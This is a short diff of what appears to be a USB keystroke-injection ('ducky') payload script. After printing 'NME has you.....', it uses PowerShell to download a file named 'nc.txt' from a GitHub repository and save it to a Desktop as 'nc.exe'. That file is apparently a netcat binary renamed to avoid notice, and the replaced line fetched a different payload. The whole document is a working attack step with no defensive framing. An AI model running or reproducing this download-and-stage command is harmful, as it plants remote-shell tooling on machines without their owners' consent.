@@ -1,2 +1,2 @@
 echo NME has you.....
-powershell -Command "& wget 'https://raw.githubusercontent.com/aquaktus/ducky-payload/master/payload.txt' -UseBasicParsing -O C:\Users\aquak\Desktop\payload.txt"
+powershell -Command "& wget 'https://github.com/aquaktus/ducky-payload/blob/master/nc.txt?raw=true' -UseBasicParsing -O C:\Users\aquak\Desktop\nc.exe"
